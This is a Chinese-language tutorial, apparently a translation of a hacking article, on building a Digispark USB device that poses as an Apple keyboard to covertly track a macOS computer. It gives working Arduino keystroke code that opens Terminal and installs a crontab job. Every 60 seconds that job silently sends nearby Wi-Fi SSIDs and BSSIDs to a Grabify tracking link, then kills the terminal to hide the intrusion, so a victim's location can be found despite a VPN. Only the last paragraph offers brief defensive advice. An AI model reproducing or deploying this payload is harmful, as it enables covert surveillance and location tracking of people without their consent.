  <p class="graf graf--p">
   <a href="https://null-byte.wonderhowto.com/how-to/hack-with-arduino-defeat-vpns-track-macos-computer-remotely-0200449/" rel="noopener noreferrer" target="_blank">
    null-byte
   </a>
   介绍了一款工具 Digispark，这是一款低成本USB开发板，可在 Arduino 中进行编程，并能够冒充键盘，从而使其能够交付大量有效载荷。
  </p>
  <p class="graf graf--p">
   仅需花费几美元，您就可以使用 Digispark 向目标MacOS计算机提供有效载荷，每60秒跟踪一次，甚至绕过VPN这样的安全性。
  </p>
  <p class="graf graf--p">
   对macOS计算机进行低成本攻击的技巧是使用系统上已安装的工具。
  </p>
  <p class="graf graf--p">
   本案例将利用一些不需要密码即可执行的命令，这些命令可以强制目标每60秒向跟踪服务器检入一次。
  </p>
  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    Arduino的黑客
   </strong>
  </h3>
  <p class="graf graf--p">
   本案例将要使用的有效载荷会利用macOS内置的工具把跟踪信息发送到远程服务器，从而使攻击者能够查看所被跟踪计算机的IP地址和位置。
  </p>
  <p class="graf graf--p">
   可能的方式是双重的。一：我们能够对 Digispark 进行编程，使其不仅像键盘一样工作，而且像苹果品牌的键盘一样工作。这意味着在插入Digispark时，不会弹出任何错误消息。 Mac只是认为这是普通的Apple键盘。
  </p>
  <p class="graf graf--p">
   二：插入后它就会迅速将我们指定的任何有效载荷输入到目标电脑中。通过正确的按键组合，可以快速启动终端窗口，收集信息、了解用户的位置。
  </p>
  <p class="graf graf--p">
   在脚本的原始版本中，仅向一个跟踪URL发送了CURL请求。这将使我们能够了解正在跟踪的设备的当前IP地址，但如果目标使用VPN，那将被证明是无用的。
  </p>
  <p class="graf graf--p">
   如果目标确实使用了VPN，我们只会知道VPN的IP地址，用户的真实位置继续被隐藏。
  </p>
  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    通过Wi-Fi网络进行抓取和跟踪
   </strong>
  </h3>
  <p class="graf graf--p">
   为了使跟踪更上一层楼，我们将把先前攻击的几个元素结合在一起。首先，使用一个CURL请求
   <strong class="markup--strong markup--p-strong">
    -referrer
   </strong>
   将数据从macOS计算机传递到跟踪服务器。
  </p>
  <p class="graf graf--p">
   在此变量中将放置目标计算机附近的Wi-Fi网络。
  </p>
  <p class="graf graf--p">
   借助 Google Maps 和
   <a class="markup--anchor markup--p-anchor" data-href="https://null-byte.wonderhowto.com/how-to/wardrive-android-phone-map-vulnerable-networks-0176136/" href="https://null-byte.wonderhowto.com/how-to/wardrive-android-phone-map-vulnerable-networks-0176136/" rel="noopener noreferrer" target="_blank">
    Wigle Wifi
   </a>
   等服务，可为大多数Wi-Fi网络的位置编制索引，因此可以轻松地查找用户所在的位置。
  </p>

   </a>
   。
  </p>
  <p class="graf graf--p">
   对于攻击者而言，请求的结果是当前IP地址以及被监视计算机附近的Wi-Fi网络。为了达到良好的效果，我们还添加了
   <strong class="markup--strong markup--p-strong">
    — silent — output /dev/null
   </strong>
   部分，以放弃对CURL请求的响应，并避免提醒用户。
  </p>
  <p class="graf graf--p">
   制作好有效载荷的核心之后，需要确定我们要多久追踪一次目标 macOS 计算机。
  </p>
  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    您需要什么
   </strong>
  </h3>
  <p class="graf graf--p">
   您将需要一台macOS目标计算机和一个 Arduino 兼容的 Digispark USB 开发板克隆（
   <a class="markup--anchor markup--p-anchor" data-href="https://www.aliexpress.com/item/32697283942.htmlhttps://www.aliexpress.com/item/32697283942.html" href="https://www.aliexpress.com/item/32697283942.htmlhttps://www.aliexpress.com/item/32697283942.html" rel="noopener noreferrer" target="_blank">
    AliExpress 有一些
   </a>
   便宜的可选）。
  </p>
  <p class="graf graf--p">
   免费的，跨平台的 Arduino IDE 将使您能够快速构建所需的东西，因此请确保已在计算机上安装了它。Arduino集成开发环境使您能够快速编写脚本并将脚本上传到类似 Arduino 的微控制器设备。
  </p>
  <p class="graf graf--p">
   您还需要一个浏览器来设置 Grabify URL 管理跟踪。创建 Grabify 链接是免费的，它允许您跟踪连接到其创建的URL的任何设备。

  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    步骤3：在 Arduino 中编写有效载荷
   </strong>
  </h3>
  <p class="graf graf--p">
   首先，调用 “DigiKeyboard.h” 库，并开始 Arduino 草图的两个部分，即设置和循环功能。
  </p>
  <p class="graf graf--p">
   在循环功能中将执行 DigiKeyboard 命令，开始于
   <strong class="markup--strong markup--p-strong">
    DigiKeyboard.sendKeyStroke(0);
   </strong>
   这就解决了 DigiSpark 有时会卡住的问题。
  </p>
  <pre class="graf graf--pre"><code class="markup--code markup--pre-code">#include "DigiKeyboard.h"
void setup() {}
void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);</code></pre>
  <p class="graf graf--p">
   设置 Digispark 进行输出后，就可以开始输入有效载荷的第一部分了。首先需要获取 Spotlight 搜索菜单以在目标的 macOS 屏幕上弹出才能使我们进入终端窗口。
  </p>
  <p class="graf graf--p">
   通过编程将 Space 和 Command 键一起按下打开终端窗口，然后在出现文本字段时键入 “ terminal”。最后按 Enter 键从建议列表中选择并启动 Terminal。这些步骤的代码如下所示。
  </p>
  <pre class="graf graf--pre"><code class="markup--code markup--pre-code">DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("terminal");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);</code></pre>
  <p class="graf graf--p">
   终端窗口打开五秒钟后使用
   <strong class="markup--strong markup--p-strong">
    crontab -e
   </strong>
   命令安排每60秒在后台执行一次任务。
  </p>
  <p class="graf graf--p">
   为了使事情更简单，我们还指定了要使用文本编辑器 “nano” 用
   <strong class="markup--strong markup--p-strong">
    export VISUAL=nano
   </strong>
   。在目标计算机上按 Enter 后，应打开一个 Nano 窗口，用于向 crontab 添加命令。
  </p>
  <pre class="graf graf--pre"><code class="markup--code markup--pre-code">DigiKeyboard.delay(5000);
  DigiKeyboard.print("export VISUAL=nano; crontab -e");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);</code></pre>
  <p class="graf graf--p">
   在打开的nano文本编辑器中对 Arduino 进行编程，以在五个星号之后粘贴我们编写的有效载荷。五个星号表示这些命令应每60秒执行一次。
  </p>
  <p class="graf graf--p">
   还需要确保用反斜杠转义引号，例如
   <strong class="markup--strong markup--p-strong">
    \’
   </strong>
   , 以避免 Arduino 将其解释为字符串的结尾。结果将如下所示。
  </p>
  <pre class="graf graf--pre"><code>DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer \'$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | sed 1d | xargs | tr -d ' ' | tr -d '-')\' https://grabify.link/YOURLINK");</code></pre>
  <p class="graf graf--p">
   现在已经插入了有效载荷，我们需要保存它。在nano中，可以通过同时按 Control-X，然后按 Y 和 Enter 来保存文件以执行此操作。它将保存有效载荷并退出 nano 到终端窗口。代码看起来像这样：
  </p>
  <pre class="graf graf--pre"><code class="markup--code markup--pre-code">DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);</code></pre>
  <p class="graf graf--p">
   最后，我们需要关闭所有内容，以使我们所做的事情不明显。为此将等待所有后台进程完成，然后杀死当前正在运行的进程的父进程。
  </p>
  <pre class="graf graf--pre"><code class="markup--code markup--pre-code">DigiKeyboard.print("wait &amp;&amp; kill -9 $(ps -p $PPID -o ppid=)");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);</code></pre>
  <p class="graf graf--p">
   将所有内容放在一起，完整的脚本应类似于下面这样。
  </p>

    <img alt="" class="aligncenter size-full wp-image-13501" data-recalc-dims="1" height="691" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/04/7-2.jpg?resize=1100%2C691&amp;ssl=1" srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/04/7-2.jpg?w=1456&amp;ssl=1 1456w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/04/7-2.jpg?resize=300%2C188&amp;ssl=1 300w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/04/7-2.jpg?resize=1024%2C643&amp;ssl=1 1024w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/04/7-2.jpg?resize=768%2C482&amp;ssl=1 768w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2020/04/7-2.jpg?resize=1100%2C691&amp;ssl=1 1100w" width="1100"/>
   </noscript>
  </p>
  <p class="graf graf--p">
   在上面的结果中，已经成功接收到属于目标附近网络的一串SSID和BSSID，以便我们进行跟踪。
  </p>
  <p class="graf graf--p">
   可以获取第一个网络 RedPolish 的 BSSID，并通过 Wigle Wifi 运行它，以查看是否找到该网络的位置。
  </p>
  <p class="graf graf--p">
   如果您没有看到引荐来源网址，那可能是因为附近网络的字符串太长。您可以在有效载荷中的
   <strong class="markup--strong markup--p-strong">
    tr -d ‘-’
   </strong>
   行之后添加
   <strong class="markup--strong markup--p-strong">
    cut -c -200
   </strong>
   来尝试解决此问题，从而将发送的字符总数减少到最多200个。
  </p>
  <p class="graf graf--p">
   在 Wigle.net 上，可以使用搜索功能来查找感兴趣的 BSSID。
  </p>
  <p class="graf graf--p">
   <img alt="" class="aligncenter size-full wp-image-13502 jetpack-lazy-image" data-lazy-sizes="(max-width: 1100px) 100vw, 1100px" data-lazy-src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=1100%2C493&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?w=1456&amp;ssl=1 1456w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=300%2C134&amp;ssl=1 300w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=1024%2C459&amp;ssl=1 1024w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=768%2C344&amp;ssl=1 768w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=1100%2C493&amp;ssl=1 1100w" data-recalc-dims="1" height="493" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=1100%2C493&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1100"/>
   <noscript>
    <img alt="" class="aligncenter size-full wp-image-13502" data-recalc-dims="1" height="493" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=1100%2C493&amp;ssl=1" srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?w=1456&amp;ssl=1 1456w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=300%2C134&amp;ssl=1 300w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=1024%2C459&amp;ssl=1 1024w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=768%2C344&amp;ssl=1 768w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2020/04/8-1.jpg?resize=1100%2C493&amp;ssl=1 1100w" width="1100"/>
   </noscript>
  </p>
  <p class="graf graf--p">
   很棒～ 即使VPN说这是澳大利亚，我们也通过跟踪他们实际靠近的网络的位置来证明用户实际上位于洛杉矶。 该VPN并不能为保护目标计算机提供帮助。
  </p>
  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    在 Arduino 中创建HID有效载荷很容易
   </strong>
  </h3>
  <p class="graf graf--p">
   如上，已经证明了使用macOS计算机上的内置工具创建一个跟踪脚本很容易，可以与一块价值1美元的 Arduino 开发板一起交付。
  </p>
  <p class="graf graf--p">
   保持计算机处于未锁定状态和无人看管状态，就很容易导致此类攻击，因此在关闭笔记本之前，请始终关闭并锁定，甚至是短暂地无人值守也要这样做。
  </p>
  <p class="graf graf--p">
   您可以通过更改默认的快捷键来使您的计算机受到这种攻击的可能性减小，从而使 Spotlight 搜索栏之类的东西可以使用其他组合键来启动。您可以在终端运行
   <strong class="markup--strong markup--p-strong">
    crontab -l
   </strong>
   以查找任何可疑的东西并列出它们。⚪️
  </p>
